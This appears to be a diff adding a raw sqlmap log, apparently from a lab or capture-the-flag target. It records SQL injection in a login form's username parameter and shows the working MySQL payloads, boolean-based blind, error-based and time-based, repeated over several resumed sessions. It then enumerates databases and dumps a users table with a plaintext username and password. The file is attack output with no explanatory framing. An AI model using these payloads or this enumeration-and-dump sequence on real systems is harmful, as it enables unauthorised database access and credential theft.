@@ -1,0 +1,102 @@
+sqlmap identified the following injection point(s) with a total of 380 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=GeqA' RLIKE (SELECT (CASE WHEN (9977=9977) THEN 0x47657141 ELSE 0x28 END))-- dOwT&password=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=GeqA' OR (SELECT 3701 FROM(SELECT COUNT(*),CONCAT(0x7171716271,(SELECT (ELT(3701=3701,1))),0x71706a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- WEti&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=GeqA' AND (SELECT 6396 FROM (SELECT(SLEEP(5)))elPa)-- JOni&password=
+---
+back-end DBMS: MySQL >= 5.0
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] users
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=GeqA' RLIKE (SELECT (CASE WHEN (9977=9977) THEN 0x47657141 ELSE 0x28 END))-- dOwT&password=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=GeqA' OR (SELECT 3701 FROM(SELECT COUNT(*),CONCAT(0x7171716271,(SELECT (ELT(3701=3701,1))),0x71706a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- WEti&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=GeqA' AND (SELECT 6396 FROM (SELECT(SLEEP(5)))elPa)-- JOni&password=
+---
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=GeqA' RLIKE (SELECT (CASE WHEN (9977=9977) THEN 0x47657141 ELSE 0x28 END))-- dOwT&password=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=GeqA' OR (SELECT 3701 FROM(SELECT COUNT(*),CONCAT(0x7171716271,(SELECT (ELT(3701=3701,1))),0x71706a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- WEti&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=GeqA' AND (SELECT 6396 FROM (SELECT(SLEEP(5)))elPa)-- JOni&password=
+---
+back-end DBMS: MySQL >= 5.0
+Database: users
+[1 table]
++-------+
+| users |
++-------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=GeqA' RLIKE (SELECT (CASE WHEN (9977=9977) THEN 0x47657141 ELSE 0x28 END))-- dOwT&password=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=GeqA' OR (SELECT 3701 FROM(SELECT COUNT(*),CONCAT(0x7171716271,(SELECT (ELT(3701=3701,1))),0x71706a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- WEti&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=GeqA' AND (SELECT 6396 FROM (SELECT(SLEEP(5)))elPa)-- JOni&password=
+---
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=GeqA' RLIKE (SELECT (CASE WHEN (9977=9977) THEN 0x47657141 ELSE 0x28 END))-- dOwT&password=
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=GeqA' OR (SELECT 3701 FROM(SELECT COUNT(*),CONCAT(0x7171716271,(SELECT (ELT(3701=3701,1))),0x71706a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- WEti&password=
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=GeqA' AND (SELECT 6396 FROM (SELECT(SLEEP(5)))elPa)-- JOni&password=
+---
+back-end DBMS: MySQL >= 5.0
+Database: users
+Table: users
+[1 entry]
++----------+------------+
+| username | password   |
++----------+------------+
+| pingudad | secretpass |
++----------+------------+
+
